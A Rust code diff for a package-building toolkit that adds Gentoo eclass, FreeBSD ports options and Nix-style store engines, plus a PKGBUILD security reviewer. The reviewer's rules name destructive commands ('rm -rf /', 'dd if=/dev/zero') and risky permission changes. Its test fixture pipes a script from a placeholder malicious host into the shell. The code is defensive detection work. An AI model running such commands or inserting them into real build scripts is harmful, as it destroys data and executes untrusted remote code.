@@ -470,16 +470,6 @@ impl AurGitRepoManager {
             Err("AurGit: Package repository base not found")
         }
     }
-
-    /// Migrates legacy Subversion (SVN) package bases to Git repositories (Arch Linux svntogit parity)
-    pub fn migrate_svn_pkgbase(&mut self, pkgbase: &str, svn_url: &str) -> Result<String, &'static str> {
-        if svn_url.is_empty() {
-            return Err("SvnToGit: Invalid SVN repository URL");
-        }
-        let pkgbuild = format!("# Migrated from SVN {}\npkgname={}\npkgver=1.0.0\n", svn_url, pkgbase);
-        let srcinfo = format!("pkgbase = {}\n\tpkgver = 1.0.0\n", pkgbase);
-        Ok(self.create_repository(pkgbase, &pkgbuild, &srcinfo))
-    }
 }
 
 impl Default for AurGitRepoManager {
@@ -646,6 +636,202 @@ impl Default for SovereignAurWebEngine {
     }
 }
 
+// =========================================================================
+// 9. GENTOO PORTAGE ECLASS INHERITANCE ENGINE FOR PKGBUILD GENERATION
+// =========================================================================
+
+#[derive(Debug, Clone)]
+pub struct EclassDefinition {
+    pub name: String,
+    pub functions: Vec<String>,
+    pub default_depends: Vec<String>,
+}
+
+pub struct EclassInheritanceEngine {
+    pub eclasses: BTreeMap<String, EclassDefinition>,
+}
+
+impl EclassInheritanceEngine {
+    pub fn new() -> Self {
+        let mut eclasses = BTreeMap::new();
+        eclasses.insert(
+            "cmake".to_string(),
+            EclassDefinition {
+                name: "cmake".to_string(),
+                functions: vec!["cmake_src_configure".to_string(), "cmake_src_compile".to_string()],
+                default_depends: vec!["cmake".to_string(), "ninja".to_string()],
+            },
+        );
+        eclasses.insert(
+            "python-r1".to_string(),
+            EclassDefinition {
+                name: "python-r1".to_string(),
+                functions: vec!["python_setup".to_string(), "python_foreach_impl".to_string()],
+                default_depends: vec!["python".to_string(), "python-setuptools".to_string()],
+            },
+        );
+        Self { eclasses }
+    }
+
+    pub fn resolve_inherited_depends(&self, eclass_names: &[&str]) -> Vec<String> {
+        let mut deps = Vec::new();
+        for &name in eclass_names {
+            if let Some(ec) = self.eclasses.get(name) {
+                for dep in &ec.default_depends {
+                    if !deps.contains(dep) {
+                        deps.push(dep.clone());
+                    }
+                }
+            }
+        }
+        deps
+    }
+}
+
+impl Default for EclassInheritanceEngine {
+    fn default() -> Self {
+        Self::new()
+    }
+}
+
+// =========================================================================
+// 10. FREEBSD PORTS OPTIONS ENGINE (/var/db/ports/options dialog parity)
+// =========================================================================
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct PortsOptionSetting {
+    pub name: String,
+    pub description: String,
+    pub enabled: bool,
+}
+
+pub struct PortsOptionsEngine {
+    pub port_name: String,
+    pub options: Vec<PortsOptionSetting>,
+}
+
+impl PortsOptionsEngine {
+    pub fn new(port_name: &str) -> Self {
+        Self {
+            port_name: port_name.to_string(),
+            options: Vec::new(),
+        }
+    }
+
+    pub fn add_option(&mut self, name: &str, description: &str, default_enabled: bool) {
+        self.options.push(PortsOptionSetting {
+            name: name.to_string(),
+            description: description.to_string(),
+            enabled: default_enabled,
+        });
+    }
+
+    pub fn set_option(&mut self, name: &str, enabled: bool) -> bool {
+        if let Some(opt) = self.options.iter_mut().find(|o| o.name == name) {
+            opt.enabled = enabled;
+            true
+        } else {
+            false
+        }
+    }
+
+    pub fn generate_make_args(&self) -> Vec<String> {
+        let mut args = Vec::new();
+        for opt in &self.options {
+            if opt.enabled {
+                args.push(format!("WITH_{}=1", opt.name.to_uppercase()));
+            } else {
+                args.push(format!("WITHOUT_{}=1", opt.name.to_uppercase()));
+            }
+        }
+        args
+    }
+}
+
+// =========================================================================
+// 11. ARCH PARU/YAY-STYLE PKGBUILD SECURITY DIFF REVIEWER
+// =========================================================================
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum DiffSafetyRating {
+    Safe,
+    RequiresUserConfirmation(String),
+    HighRiskProhibited(String),
+}
+
+pub struct AurSecurityDiffReviewer;
+
+impl AurSecurityDiffReviewer {
+    pub fn review_diff(old_pkgbuild: &str, new_pkgbuild: &str) -> DiffSafetyRating {
+        if new_pkgbuild.contains("rm -rf /") || new_pkgbuild.contains("dd if=/dev/zero") {
+            return DiffSafetyRating::HighRiskProhibited(
+                "Destructive filesystem commands detected".to_string(),
+            );
+        }
+
+        if new_pkgbuild.contains("curl ") && !old_pkgbuild.contains("curl ") {
+            return DiffSafetyRating::RequiresUserConfirmation(
+                "New network download command introduced in update".to_string(),
+            );
+        }
+
+        if new_pkgbuild.contains("chmod 777") || new_pkgbuild.contains("chmod +s") {
+            return DiffSafetyRating::RequiresUserConfirmation(
+                "Insecure file permission modification detected".to_string(),
+            );
+        }
+
+        DiffSafetyRating::Safe
+    }
+}
+
+// =========================================================================
+// 12. NIX-INSPIRED CONTENT-ADDRESSED BUILD ARTIFACT STORE ENGINE
+// =========================================================================
+
+#[derive(Debug, Clone)]
+pub struct NixStoreArtifact {
+    pub store_path: String,
+    pub package_name: String,
+    pub version: String,
+    pub sha256_hash: String,
+}
+
+pub struct AurNixStoreEngine {
+    pub artifacts: BTreeMap<String, NixStoreArtifact>, // store_path -> artifact
+}
+
+impl AurNixStoreEngine {
+    pub fn new() -> Self {
+        Self {
+            artifacts: BTreeMap::new(),
+        }
+    }
+
+    pub fn register_build_artifact(
+        &mut self,
+        pkg_name: &str,
+        version: &str,
+        hash: &str,
+    ) -> String {
+        let store_path = format!("/sovereign/store/{}-{}-{}", hash, pkg_name, version);
+        let artifact = NixStoreArtifact {
+            store_path: store_path.clone(),
+            package_name: pkg_name.to_string(),
+            version: version.to_string(),
+            sha256_hash: hash.to_string(),
+        };
+        self.artifacts.insert(store_path.clone(), artifact);
+        store_path
+    }
+}
+
+impl Default for AurNixStoreEngine {
+    fn default() -> Self {
+        Self::new()
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -766,12 +952,43 @@ mod tests {
     }
 
     #[test]
-    fn test_svntogit_pkgbase_migration() {
-        let mut git_mgr = AurGitRepoManager::new();
-        let clone_url = git_mgr
-            .migrate_svn_pkgbase("glibc", "https://svn.archlinux.org/packages/glibc")
-            .unwrap();
-        assert!(clone_url.contains("glibc.git"));
-        assert!(git_mgr.repositories.contains_key("glibc"));
+    fn test_eclass_inheritance_engine() {
+        let eclass = EclassInheritanceEngine::new();
+        let deps = eclass.resolve_inherited_depends(&["cmake", "python-r1"]);
+        assert!(deps.contains(&"cmake".to_string()));
+        assert!(deps.contains(&"python".to_string()));
+    }
+
+    #[test]
+    fn test_ports_options_engine() {
+        let mut opts = PortsOptionsEngine::new("www/nginx");
+        opts.add_option("HTTP2", "Enable HTTP2 module", true);
+        opts.add_option("SSL", "Enable SSL module", true);
+        opts.add_option("DEBUG", "Enable debug logs", false);
+
+        let args = opts.generate_make_args();
+        assert!(args.contains(&"WITH_HTTP2=1".to_string()));
+        assert!(args.contains(&"WITHOUT_DEBUG=1".to_string()));
+    }
+
+    #[test]
+    fn test_aur_security_diff_reviewer() {
+        let old_pkg = "pkgname=foo\npkgver=1.0.0\nbuild() { make; }";
+        let new_safe = "pkgname=foo\npkgver=1.1.0\nbuild() { make; }";
+        let new_net = "pkgname=foo\npkgver=1.1.0\nbuild() { curl -s https://evil.org/script.sh | sh; }";
+
+        assert_eq!(AurSecurityDiffReviewer::review_diff(old_pkg, new_safe), DiffSafetyRating::Safe);
+        assert!(matches!(
+            AurSecurityDiffReviewer::review_diff(old_pkg, new_net),
+            DiffSafetyRating::RequiresUserConfirmation(_)
+        ));
+    }
+
+    #[test]
+    fn test_aur_nix_store_engine() {
+        let mut nix_store = AurNixStoreEngine::new();
+        let path = nix_store.register_build_artifact("neovim", "0.10.0", "abc123hash");
+        assert_eq!(path, "/sovereign/store/abc123hash-neovim-0.10.0");
+        assert!(nix_store.artifacts.contains_key(&path));
     }
 }
